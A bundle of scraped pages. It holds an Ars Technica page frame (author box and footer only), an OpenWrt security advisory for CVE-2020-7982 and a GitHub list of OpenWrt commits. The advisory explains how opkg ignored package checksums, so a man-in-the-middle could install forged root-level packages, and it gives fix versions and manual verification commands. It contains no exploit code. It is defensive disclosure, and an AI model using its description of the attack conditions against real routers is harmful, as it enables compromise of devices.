[![Photo of Dan Goodin](/wp-content/uploads/2018/10/Dang.jpg)](https://arstechnica.com/author/dan-goodin/)
[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
Senior Security Editor

[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
Senior Security Editor

Dan Goodin is Senior Security Editor at Ars Technica, where he oversees coverage of malware, computer espionage, botnets, hardware hacking, encryption, and passwords. In his spare time, he enjoys gardening, cooking, and following the independent music scene. Dan is based in San Francisco. Follow him at [here](https://infosec.exchange/%40dangoodin) on Mastodon and [here](https://bsky.app/profile/dangoodin.bsky.social) on Bluesky. Contact him on Signal at DanArs.82.

[52 Comments](https://arstechnica.com/information-technology/2020/03/openwrt-is-vulnerable-to-attacks-that-execute-malicious-code/#comments "52 comments")

Comments

[Forum view](https://arstechnica.com/civis/threads/openwrt-is-vulnerable-to-attacks-that-execute-malicious-code.1466044/)

![Loading](https://arstechnica.com/wp-content/themes/ars-v9/public/images/firework-loader.75ab30.gif)

[Prev story](https://arstechnica.com/tech-policy/2020/03/zooms-privacy-problems-are-growing-as-platform-explodes-in-popularity/ "Go to: Zoom’s privacy problems are growing as platform explodes in popularity")

[Next story](https://arstechnica.com/science/2020/03/fda-approves-the-emergency-use-of-chloroquine-for-covid-19/ "Go to: FDA approves the emergency use of chloroquine for COVID-19")

Most Read

1. [![Listing image for first story in Most Read: Camera owner asks Canon, skies: Why is it $5/month for webcam software?](https://cdn.arstechnica.net/wp-content/uploads/2025/01/g5_mark2-768x432.jpg)](https://arstechnica.com/gadgets/2025/01/canon-charges-50-per-year-to-use-a-900-camera-as-a-functional-webcam/)

   1.
   [Camera owner asks Canon, skies: Why is it $5/month for webcam software?](https://arstechnica.com/gadgets/2025/01/canon-charges-50-per-year-to-use-a-900-camera-as-a-functional-webcam/)
2. 2.
   [Under new law, cops bust famous cartoonist for AI-generated child sex abuse images](https://arstechnica.com/tech-policy/2025/01/under-new-law-cops-bust-famous-cartoonist-for-ai-generated-child-sex-abuse-images/)
3. 3.
   [A solid electrolyte gives lithium-sulfur batteries ludicrous endurance](https://arstechnica.com/science/2025/01/a-solid-electrolyte-gives-lithium-sulfur-batteries-ludicrous-endurance/)
4. 4.
   [AT&T kills home Internet service in NY over law requiring $15 or $20 plans](https://arstechnica.com/tech-policy/2025/01/att-complies-with-law-requiring-cheap-internet-by-ending-a-service-in-ny/)
5. 5.
   [Fire destroys Starship on its seventh test flight, raining debris from space](https://arstechnica.com/space/2025/01/fire-destroys-starship-on-its-seventh-test-flight-raining-debris-from-space/)

Customize

Ars Technica has been separating the signal from
the noise for over 25 years. With our unique combination of
technical savvy and wide-ranging interest in the technological arts
and sciences, Ars is the trusted source in a sea of information. After
all, you don’t need to know everything, only what’s important.

More
from Ars

* [About Us](https://arstechnica.com/about-us/)
* [Staff Directory](https://arstechnica.com/staff-directory/)
* [Newsletters](https://arstechnica.com/newsletters/)
* [Ars Videos](https://arstechnica.com/video/)
* [General FAQ](https://arstechnica.com/general-faq/)
* [RSS Feeds](https://arstechnica.com/rss-feeds/)

Contact

* [Contact us](https://arstechnica.com/contact-us/)
* [Advertise with us](https://www.condenast.com/brands/ars-technica)
* [Reprints](https://arstechnica.com/reprints/)

Do Not Sell My Personal
Information

© 2025 Condé Nast. All rights reserved. Use of and/or
registration on any portion of this site constitutes acceptance of our [User Agreement](https://www.condenast.com/user-agreement/) and
[Privacy Policy and
Cookie Statement](https://www.condenast.com/privacy-policy/) and [Ars
Technica Addendum](/amendment-to-conde-nast-user-agreement-privacy-policy/) and [Your
California Privacy Rights](https://www.condenast.com/privacy-policy/#california). Ars Technica may earn compensation on
sales from links on this site. [Read our
affiliate link policy](/affiliate-link-policy/). The material on this site may not be
reproduced, distributed, transmitted, cached or otherwise used, except
with the prior written permission of Condé Nast. [Ad
Choices](https://www.aboutads.info/)



=== Content from openwrt.org_22d52019_20250119_113930.html ===


[![OpenWrt Wiki](/_media/logo.png)OpenWrt Wiki](/start "OpenWrt Wiki")

* Tools
  + User Tools
  + [Log In](/advisory/2020-01-31-1?do=login&sectok= "Log In")
  + Site Tools
  + [Recent Changes](/advisory/2020-01-31-1?do=recent "Recent Changes [r]")
  + [Media Manager](/advisory/2020-01-31-1?do=media&ns=advisory "Media Manager")
  + [Sitemap](/advisory/2020-01-31-1?do=index "Sitemap [x]")
  + Page Tools
  + [Show pagesource](/advisory/2020-01-31-1?do=edit "Show pagesource [v]")
  + [Old revisions](/advisory/2020-01-31-1?do=revisions "Old revisions [o]")
  + [Backlinks](/advisory/2020-01-31-1?do=backlink "Backlinks")
  + [Back to top](#dokuwiki__top "Back to top [t]")

* Translations of this page
  + Translations of this page [?](/meta/translation "meta:translation")
  + [English (en)](/advisory/2020-01-31-1 "English")
  + [|العربية (ar)](/ar/advisory/2020-01-31-1 "|العربية")
  + [Česky (cs)](/cs/advisory/2020-01-31-1 "Česky")
  + [Deutsch (de)](/de/advisory/2020-01-31-1 "Deutsch")
  + [Español (es)](/es/advisory/2020-01-31-1 "Español")
  + [Français (fr)](/fr/advisory/2020-01-31-1 "Français")
  + [Magyar (hu)](/hu/advisory/2020-01-31-1 "Magyar")
  + [Italiano (it)](/it/advisory/2020-01-31-1 "Italiano")
  + [日本語 (ja)](/ja/advisory/2020-01-31-1 "日本語")
  + [한국어 (ko)](/ko/advisory/2020-01-31-1 "한국어")
  + [Polski (pl)](/pl/advisory/2020-01-31-1 "Polski")
  + [Português (pt)](/pt/advisory/2020-01-31-1 "Português")
  + [Português (pt-br)](/pt-br/advisory/2020-01-31-1 "Português")
  + [Русский (ru)](/ru/advisory/2020-01-31-1 "Русский")
  + [Türkçe (tr)](/tr/advisory/2020-01-31-1 "Türkçe")
  + [Українська (uk)](/uk/advisory/2020-01-31-1 "Українська")
  + [Tiếng Việt (vi)](/vi/advisory/2020-01-31-1 "Tiếng Việt")
  + [中文 (zh)](/zh/advisory/2020-01-31-1 "中文")
  + [繁體中文 (zh-tw)](/zh-tw/advisory/2020-01-31-1 "繁體中文")

* [Log In](/advisory/2020-01-31-1?do=login&sectok= "Log In")

---

1. You are here
2. [Home](/start "start")
3. [OpenWrt Security Advisories](/advisory/start "advisory:start")
4. [Security Advisory 2020-01-31-1 - Opkg susceptible to MITM (CVE-2020-7982)](/advisory/2020-01-31-1 "advisory:2020-01-31-1")

---

 Learn about OpenWrt
#### Learn about OpenWrt

* [Supported devices](/supported_devices "supported_devices")
* [Packages](/packages/start "packages:start")
* [Downloads](/downloads "downloads")
* [Documentation](/docs/start "docs:start")
  + [Quick start guide](/docs/guide-quick-start/start "docs:guide-quick-start:start")
  + [User guide](/docs/guide-user/start "docs:guide-user:start")
  + [Developer guide](/docs/guide-developer/start "docs:guide-developer:start")
* [Security](/docs/guide-developer/security "docs:guide-developer:security")
* [FAQ](/faq "faq")
* [Forum](https://forum.openwrt.org/ "https://forum.openwrt.org/")
#### Contributing

* [Submitting patches](/submitting-patches "submitting-patches")
* [Reporting bugs](/bugs "bugs")
* [Contributing to wiki](/wiki/wikirules "wiki:wikirules")
#### Project

* [About OpenWrt](/about "about")
* [Rules](/rules "rules")
* [Infrastructure](/infrastructure "infrastructure")
* [Donate](/donate "donate")
* [Merchandise](/merchandise "merchandise")
* [Website](/wiki/start "wiki:start")
* [Trademark policy](/trademark "trademark")
* [License](/license "license")
* [Contacts](/contact "contact")

* [Show pagesource](/advisory/2020-01-31-1?do=edit "Show pagesource [v]")
* [Old revisions](/advisory/2020-01-31-1?do=revisions "Old revisions [o]")
* [Backlinks](/advisory/2020-01-31-1?do=backlink "Backlinks")
* [Back to top](#dokuwiki__top "Back to top [t]")

×
####

###### Table of Contents

* [Security Advisory 2020-01-31-1 - Opkg susceptible to MITM (CVE-2020-7982)](#security_advisory_2020-01-31-1_-_opkg_susceptible_to_mitm_cve-2020-7982)
  + - [DESCRIPTION](#description)
    - [REQUIREMENTS](#requirements)
    - [MITIGATIONS](#mitigations)
    - [AFFECTED VERSIONS](#affected_versions)
    - [CREDITS](#credits)

# Security Advisory 2020-01-31-1 - Opkg susceptible to MITM (CVE-2020-7982)

### DESCRIPTION

A bug in the package list parse logic of OpenWrt's opkg fork caused the
package manager to ignore SHA-256 checksums embedded in the signed repository
index, effectively bypassing integrity checking of downloaded .ipk artifacts.

The bug has been introduced with commit [https://git.openwrt.org/54cc7e3](https://git.openwrt.org/54cc7e3 "https://git.openwrt.org/54cc7e3") which
failed to advance the proper string pointer when skipping the leading white-
space portition of the checksum string, causing the subsequent hex decoding
loop to return early with a zero length checksum.

Due to the fact that opkg on OpenWrt runs as root and has write access to the
entire filesystem, arbitrary code could be injected by the means of forged
.ipk packages with malicious payload.

CVE-2020-7982 has been assigned to this issue.

### REQUIREMENTS

In order to exploit this vulnerability, a malicious actor needs to pose as
MITM, serving a valid and signed package index - e.g. one obtained from
downloads.openwrt.org - and one or more forged .ipk packages having the same
size as specified in the repository index while an `opkg install` command
is invoked on the victim system.

### MITIGATIONS

To fix this issue, upgrade to the latest OpenWrt version. The fix is contained
in the following and later OpenWrt releases:

* OpenWrt master: 2020-01-29 reboot-12146-gc69c20c667
* OpenWrt 19.07: 2019-01-29 v19.07.1-1-g4668ae3bed
* OpenWrt 18.06: 2019-01-29 v18.06.7-1-g6bfde67581

The fixed opkg package will carry the version 2020-01-25.

Alternatively, to update the opkg package itself without upgrading the entire
firmware, the following commands may be used once all repositories have been
updated:

```
 cd /tmp
 opkg update
 opkg download opkg
 zcat ./opkg-lists/openwrt_base | grep -A10 "Package: opkg" | grep SHA256sum
 sha256sum ./opkg_2020-01-25-c09fe209-1_*.ipk
```

Compare both checksums and, if matching, proceed with installing the package:

```
 opkg install ./opkg_2020-01-25-c09fe209-1_*.ipk
```
### AFFECTED VERSIONS

To our knowledge, OpenWrt versions 18.06.0 to 18.06.6 and 19.07.0 as well as
LEDE 17.01.0 to 17.01.7 are affected. The fixed packages are integrated in
the OpenWrt 18.06.7, OpenWrt 19.07.1 and subsequent releases.

Older versions of OpenWrt (e.g. OpenWrt 15.05 and LEDE 17.01) are end of life
and not supported any more.

### CREDITS

The issue was discovered by Guido Vranken for ForAllSecure, Inc.

This website uses cookies. By using the website, you agree with storing cookies on your computer. Also you acknowledge that you have read and understand our Privacy Policy. If you do not agree leave the website.OK[More information about cookies](https://en.wikipedia.org/wiki/HTTP_cookie)

* Last modified: 2020/01/31 22:02
* by jow

**Self-registration in the wiki has been disabled.

If you want to contribute to the OpenWrt wiki, please post [HERE](https://forum.openwrt.org/t/applying-for-openwrt-wiki-account/101671 "https://forum.openwrt.org/t/applying-for-openwrt-wiki-account/101671") in the forum or ask on IRC for access.**

---

[![cc](/lib/tpl/bootstrap3/images/license/cc.png) ![by](/lib/tpl/bootstrap3/images/license/by.png) ![sa](/lib/tpl/bootstrap3/images/license/sa.png)](https://creativecommons.org/licenses/by-sa/4.0/deed.en "CC Attribution-Share Alike 4.0 International")

Except where otherwise noted, content on this wiki is licensed under the following license:
[CC Attribution-Share Alike 4.0 International](https://creativecommons.org/licenses/by-sa/4.0/deed.en "CC Attribution-Share Alike 4.0 International")

![](/lib/exe/taskrunner.php?id=advisory%3A2020-01-31-1&1737286770)



=== Content from github.com_2332b27a_20250119_113930.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenwrt%2Fopenwrt%2Fcommits%2Fmaster)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenwrt%2Fopenwrt%2Fcommits%2Fmaster)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcommits%2Fshow&source=header-repo&source_repo=openwrt%2Fopenwrt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openwrt](/openwrt)
/
**[openwrt](/openwrt/openwrt)**
Public

* [Notifications](/login?return_to=%2Fopenwrt%2Fopenwrt) You must be signed in to change notification settings
* [Fork
  10.8k](/login?return_to=%2Fopenwrt%2Fopenwrt)
* [Star
   21.2k](/login?return_to=%2Fopenwrt%2Fopenwrt)

* [Code](/openwrt/openwrt/tree/master)
* [Issues
  2.5k](/openwrt/openwrt/issues)
* [Pull requests
  576](/openwrt/openwrt/pulls)
* [Actions](/openwrt/openwrt/actions)
* [Projects
  2](/openwrt/openwrt/projects)
* [Security](/openwrt/openwrt/security)
* [Insights](/openwrt/openwrt/pulse)

Additional navigation options

* [Code](/openwrt/openwrt/tree/master)
* [Issues](/openwrt/openwrt/issues)
* [Pull requests](/openwrt/openwrt/pulls)
* [Actions](/openwrt/openwrt/actions)
* [Projects](/openwrt/openwrt/projects)
* [Security](/openwrt/openwrt/security)
* [Insights](/openwrt/openwrt/pulse)

# Commits

## Branch selector

 master
## User selector

All users
## Datepicker

All time
## Commit History

### Commits on Jan 19, 2025

* #### [ethtool: update to 6.11](/openwrt/openwrt/commit/9454331b7fc896704a2c60b28767c282eb9ca0bd "ethtool: update to 6.11 Version 6.11 - October 8, 2024 * Feature: cmis: print active and inactive firmware versions * Feature: flash transceiver module firmware (--flash-module-firmware) * Feature: add T1BRR 10Mb/s mode to link mode tables * Feature: support for disabling netlink from command line * Fix: fix lanes parameter format specifier * Fix: add missing clause 33 PSE manual description * Fix: qsf: Better handling of Page A2h netlink read failure * Fix: rss: retrieve ring count using ETHTOOL_GRXRINGS ioctl (-x) * Misc: man page formatting fix * changelog here: https://git.kernel.org/pub/scm/network/ethtool/ethtool.git/commit/NEWS?id=c0ea4b70c71334ef038f7a3416b228a50dada406 Tested on gl.inet MT6000, retrieve ring count is now working Signed-off-by: Andrea Pesaresi <andreapesaresi82@gmail.com> Link: https://github.com/openwrt/openwrt/pull/17607 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for 9454331 ![pesa1234](https://avatars.githubusercontent.com/u/6216993?v=4&size=32)![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)[pesa1234](/openwrt/openwrt/commits?author=pesa1234)authored and[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[9454331](/openwrt/openwrt/commit/9454331b7fc896704a2c60b28767c282eb9ca0bd)Copy full SHA for 9454331
* #### [mac80211: Fix tracing backport](/openwrt/openwrt/commit/9096f996baf5555bae1c3175a9ddf7bbd3be9a9c "mac80211: Fix tracing backport Update handling of macro __assign_str() to also support the one-argument variant when building against kernel 6.10 or later. This is needed for building the next LTS kernel 6.12. Fixes: 384d079fd8 (\"mac80211: update to version 6.11\") Signed-off-by: Tony Ambardar <itugrok@yahoo.com> Link: https://github.com/openwrt/openwrt/pull/17456 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for 9096f99 ![guidosarducci](https://avatars.githubusercontent.com/u/14342969?v=4&size=32)![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)[guidosarducci](/openwrt/openwrt/commits?author=guidosarducci)authored and[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[9096f99](/openwrt/openwrt/commit/9096f996baf5555bae1c3175a9ddf7bbd3be9a9c)Copy full SHA for 9096f99
* #### [generic: add leds\_st1202 patch to fix NULL pointer access](/openwrt/openwrt/commit/ec8a128cbb2106132731fcb3528c9004859b86f2 "generic: add leds_st1202 patch to fix NULL pointer access As per @KanjiMonster comment: st1202_dt_init() calls devm_led_classdev_register_ext() before the internal data structures are properly setup, so the leds become visible to user space while being partially initialized, leading to a window where trying to access them causes a NULL pointer access. Move devm_led_classdev_register_ext() to the last thing to happen during initialization. Signed-off-by: Manuel Fombuena <fombuena@outlook.com> Link: https://github.com/openwrt/openwrt/pull/17543 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for ec8a128 ![innovara](https://avatars.githubusercontent.com/u/1219020?v=4&size=32)![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)[innovara](/openwrt/openwrt/commits?author=innovara)authored and[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[ec8a128](/openwrt/openwrt/commit/ec8a128cbb2106132731fcb3528c9004859b86f2)Copy full SHA for ec8a128
### Commits on Jan 18, 2025

* #### [mediatek-filogic: fix wax220 wifi leds](/openwrt/openwrt/commit/99431e315039d7f9689b21a8aa220adadf52a886 "mediatek-filogic: fix wax220 wifi leds The WAX220 does have a 2.4GHz and 5GHz wifi led, which was set to trigger on netdev before. This commit changes this to trigger on activity of the respective radio Signed-off-by: Florian Maurer <f.maurer@outlook.de> Link: https://github.com/openwrt/openwrt/pull/17627 Signed-off-by: Hauke Mehrtens <hauke@hauke-m.de>")

  Show description for 99431e3 ![maurerle](https://avatars.githubusercontent.com/u/25026204?v=4&size=32)![hauke](https://avatars.githubusercontent.com/u/78494?v=4&size=32)[maurerle](/openwrt/openwrt/commits?author=maurerle)authored and[hauke](/openwrt/openwrt/commits?author=hauke)committed[99431e3](/openwrt/openwrt/commit/99431e315039d7f9689b21a8aa220adadf52a886)Copy full SHA for 99431e3
* #### [mediatek: filogic: Cudy WR3000H: Fix SUPPORTED\_DEVICES](/openwrt/openwrt/commit/0f8a5a5fd6929a3795a67ad4f98a7bc7358d22d9 "mediatek: filogic: Cudy WR3000H: Fix SUPPORTED_DEVICES Fix the name used for the transition image from Cudy. This should make it possible to use the cudy transition image. Fixes: 9d66b8b312fb (\"mediatek: filogic: Add support for cudy wr3000h\") Link: https://github.com/openwrt/openwrt/pull/17652 Signed-off-by: Hauke Mehrtens <hauke@hauke-m.de>")

  Show description for 0f8a5a5[![hauke](https://avatars.githubusercontent.com/u/78494?v=4&size=32)](/hauke)[hauke](/openwrt/openwrt/commits?author=hauke)committed[0f8a5a5](/openwrt/openwrt/commit/0f8a5a5fd6929a3795a67ad4f98a7bc7358d22d9)Copy full SHA for 0f8a5a5
* #### [ipq4019: patch initialization of Lantiq DSL on FritzBox 7530.](/openwrt/openwrt/commit/676dcb1b2cf84142a61d51a15e7a8e1bdc937c23 "ipq4019: patch initialization of Lantiq DSL on FritzBox 7530. Some VRX518 modems fail to initialize properly with the error message \"dc_ep_clk_on failed\". As a result, the DSL data path doesn't work. This hack, which is based on code from the FRITZ!Box 7530 GPL archive, fixes the issue. It changes the PCIe vendor/device ID to values matching a Lantiq SoC. It also appears to emulate a Lantiq CPU ID register for connected PCIe devices, by remapping the matching address area to a specially crafted buffer using the address translation unit. A dedicated compatible is created to activate this in the device tree, so this shouldn't affect any devices other than FRITZ!Box 7530/7520. Original investigation was done in https://github.com/janh/openwrt/commit/59f52125178146a9dc44290c11c63e5e029e8044 which used the \"avm,host_magic\" property to enabled the patch. Signed-off-by: Christian Marangi <ansuelsmth@gmail.com> Signed-off-by: Florian Maurer <f.maurer@outlook.de> Link: https://github.com/openwrt/openwrt/pull/17622 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for 676dcb1 ![Ansuel](https://avatars.githubusercontent.com/u/20289090?v=4&size=32)![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)[Ansuel](/openwrt/openwrt/commits?author=Ansuel)authored and[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[676dcb1](/openwrt/openwrt/commit/676dcb1b2cf84142a61d51a15e7a8e1bdc937c23)Copy full SHA for 676dcb1
* #### [ath79: add extended AR9344 reset sequence](/openwrt/openwrt/commit/144af32b47be6181f01815762159dff863f4616b "ath79: add extended AR9344 reset sequence According to datasheet, on AR9344 the switch and switch analog need to be reset first before initiating a full reset. Resetting these systems fixes spurious reset hangs on Atheros AR9344 SoCs. Link: https://github.com/freifunk-gluon/gluon/issues/2904 Signed-off-by: David Bauer <mail@david-bauer.net>")

  Show description for 144af32[![blocktrron](https://avatars.githubusercontent.com/u/16539439?v=4&size=32)](/blocktrron)[blocktrron](/openwrt/openwrt/commits?author=blocktrron)committed[144af32](/openwrt/openwrt/commit/144af32b47be6181f01815762159dff863f4616b)Copy full SHA for 144af32
* #### [Revert "ath79: reset ETH switch for AR9344"](/openwrt/openwrt/commit/937b5a3e0017f4f39c0f7727a910d2df78fc4ce9 "Revert \"ath79: reset ETH switch for AR9344\" This reverts commit 916af73fc388d638b1a717a2411792e0680dd8e6. It was reported this change did not fix the reboot issues on AR9344. Signed-off-by: David Bauer <mail@david-bauer.net>")

  Show description for 937b5a3[![blocktrron](https://avatars.githubusercontent.com/u/16539439?v=4&size=32)](/blocktrron)[blocktrron](/openwrt/openwrt/commits?author=blocktrron)committed[937b5a3](/openwrt/openwrt/commit/937b5a3e0017f4f39c0f7727a910d2df78fc4ce9)Copy full SHA for 937b5a3
* #### [qualcommax: dl-wrx36: fix 2.5G port LED-s](/openwrt/openwrt/commit/2d077913cd53cad33123c8a9bf6da8a1c5576c69 "qualcommax: dl-wrx36: fix 2.5G port LED-s Currently, 2.5G port LED-s on Dynalink are incorrectly configured and thus they will light up all of the time. So, lets fix this by: 1. Current green LED is actually yellow, change the color 2. Fix its polarity as its actually active-low 3. The yellow LED that was registered as being connected to LED_1 pin on the PHY is not actually connected at all, so remove it. 4. The actual green LED is connected to LED_2 on the PHY so add it. Fixes: 75ad5c24142a (\"qualcommax: switch to qca8081 upstream PHY driver\") Fixes: #14502 Link: https://github.com/openwrt/openwrt/pull/17656 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for 2d07791[![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)](/robimarko)[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[2d07791](/openwrt/openwrt/commit/2d077913cd53cad33123c8a9bf6da8a1c5576c69)Copy full SHA for 2d07791
* #### [realtek: Switch RTL8231 driver on Zyxel GS1900-48](/openwrt/openwrt/commit/45aafe67f385a2b6cf65894b2f46ee8e33d87f92 "realtek: Switch RTL8231 driver on Zyxel GS1900-48 Switch the Zyxel GS1900-48 over to the new MDIO-based driver for the RTL8231 GPIO expander. Signed-off-by: Sander Vanheule <sander@svanheule.net>")

  Show description for 45aafe6[![svanheule](https://avatars.githubusercontent.com/u/6670918?v=4&size=32)](/svanheule)[svanheule](/openwrt/openwrt/commits?author=svanheule)committed[45aafe6](/openwrt/openwrt/commit/45aafe67f385a2b6cf65894b2f46ee8e33d87f92)Copy full SHA for 45aafe6
* #### [realtek: rtl839x: Enable RTL8231 MFD driver](/openwrt/openwrt/commit/fd5797b7ce6856539ec0f88b25a766fc2ce00c19 "realtek: rtl839x: Enable RTL8231 MFD driver Enable the RTL8231 MFD core driver, as well as the pinctrl/gpio driver to allow RTL839x devices to use it. Signed-off-by: Sander Vanheule <sander@svanheule.net>")

  Show description for fd5797b[![svanheule](https://avatars.githubusercontent.com/u/6670918?v=4&size=32)](/svanheule)[svanheule](/openwrt/openwrt/commits?author=svanheule)committed[fd5797b](/openwrt/openwrt/commit/fd5797b7ce6856539ec0f88b25a766fc2ce00c19)Copy full SHA for fd5797b
* #### [realtek: rtl839x: Enable AUX MDIO controller](/openwrt/openwrt/commit/cddcc69ddf9c6284d6c9a6399c4ea48d7a044719 "realtek: rtl839x: Enable AUX MDIO controller Enable the driver for the Realtek Otto auxiliary MDIO driver so RTL839x devices can use it. The related node is added to the base devicetree for rtl839x-based devices, so they can enabled and use it when required. Signed-off-by: Sander Vanheule <sander@svanheule.net>")

  Show description for cddcc69[![svanheule](https://avatars.githubusercontent.com/u/6670918?v=4&size=32)](/svanheule)[svanheule](/openwrt/openwrt/commits?author=svanheule)committed[cddcc69](/openwrt/openwrt/commit/cddcc69ddf9c6284d6c9a6399c4ea48d7a044719)Copy full SHA for cddcc69
* #### [realtek: Update aux-mdio driver](/openwrt/openwrt/commit/52ffef647152578ba89d2e4c1f9f2f869a3fc8a8 "realtek: Update aux-mdio driver For RTL839x, the driver was producing frequent timeouts on bus accesses. Increasing the timeout to the one from a recent Realtek SDK resolves these timeouts. To minimize overhead on different SoCs, each controller can specify their own timeout. This also add support for the register format as used on RTL93xx. Support is added for the RTL930x \"ext gpio\" controller. Signed-off-by: Sander Vanheule <sander@svanheule.net>")

  Show description for 52ffef6[![svanheule](https://avatars.githubusercontent.com/u/6670918?v=4&size=32)](/svanheule)[svanheule](/openwrt/openwrt/commits?author=svanheule)committed[52ffef6](/openwrt/openwrt/commit/52ffef647152578ba89d2e4c1f9f2f869a3fc8a8)Copy full SHA for 52ffef6
* #### [wifi-scripts: add a few missing auth\_type checks in ucode](/openwrt/openwrt/commit/7482296ebf73d3c9b7f40e2f37670d337137598f "wifi-scripts: add a few missing auth_type checks in ucode Add some missing documented or commonly used values Fixes: https://github.com/openwrt/openwrt/issues/17431 Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for 7482296[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[7482296](/openwrt/openwrt/commit/7482296ebf73d3c9b7f40e2f37670d337137598f)Copy full SHA for 7482296
### Commits on Jan 17, 2025

* #### [airoha: an7581: add pending PCI patch](/openwrt/openwrt/commit/f22febae1a6b7c654eaf09ed02c0d0017be6d73a "airoha: an7581: add pending PCI patch Add pending PCI patch that should correctly fix mediatek driver with Airoha SoC. Signed-off-by: Christian Marangi <ansuelsmth@gmail.com>")

  Show description for f22feba[![Ansuel](https://avatars.githubusercontent.com/u/20289090?v=4&size=32)](/Ansuel)[Ansuel](/openwrt/openwrt/commits?author=Ansuel)committed[f22feba](/openwrt/openwrt/commit/f22febae1a6b7c654eaf09ed02c0d0017be6d73a)Copy full SHA for f22feba
* #### [airoha: an7581: backport ETS patch for Airoha ethernet](/openwrt/openwrt/commit/67635578fd19d0576c54bbe722a9664e8a6ab2a6 "airoha: an7581: backport ETS patch for Airoha ethernet Backport ETS patch for Airoha ethernet and refresh affected patches. Signed-off-by: Christian Marangi <ansuelsmth@gmail.com>")

  Show description for 6763557[![Ansuel](https://avatars.githubusercontent.com/u/20289090?v=4&size=32)](/Ansuel)[Ansuel](/openwrt/openwrt/commits?author=Ansuel)committed[6763557](/openwrt/openwrt/commit/67635578fd19d0576c54bbe722a9664e8a6ab2a6)Copy full SHA for 6763557
* #### [generic: backport pending Realtek PHY patches](/openwrt/openwrt/commit/7924acdd63490aa436bf114d290cb56cd4eba008 "generic: backport pending Realtek PHY patches These patches have been accepted, so we can move them from pending to backported. Signed-off-by: Álvaro Fernández Rojas <noltari@gmail.com>")

  Show description for 7924acd ![Noltari](https://avatars.githubusercontent.com/u/264346?v=4&size=32)![dangowrt](https://avatars.githubusercontent.com/u/9948313?v=4&size=32)[Noltari](/openwrt/openwrt/commits?author=Noltari)authored and[dangowrt](/openwrt/openwrt/commits?author=dangowrt)committed[7924acd](/openwrt/openwrt/commit/7924acdd63490aa436bf114d290cb56cd4eba008)Copy full SHA for 7924acd
